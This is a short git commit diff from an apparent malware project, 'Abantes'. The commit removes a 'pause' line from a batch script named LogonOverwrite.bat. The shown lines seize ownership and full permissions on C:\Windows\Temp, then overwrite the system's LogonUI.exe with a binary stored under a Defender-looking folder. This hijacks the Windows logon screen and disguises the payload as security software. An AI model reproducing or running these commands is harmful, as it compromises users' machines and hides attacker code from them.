add48e3cbf5d68c62f2ed985d976ae81bea7db65
Chris Martin <chrixsmar@gmail.com>
2018-04-14 14:07:02 +0100

    remove pause logon overwrite

--- Abantes/Resources/LogonOverwrite.bat
+++ Abantes/Resources/LogonOverwrite.bat
@@ -6,4 +6,3 @@ takeown /f "C:\Windows\Temp" /r /d y
 icacls "C:\Windows\Temp" /granted %username%:F /T /C
 copy "C:\Windows\Defender\LogonUIStart.exe" "C:\Windows\System32\LogonUI.exe" /Y
 copy "C:\Windows\Defender\LogonUi.exe" "C:\Windows\Temp\LogonUi.exe" /Y
-pause
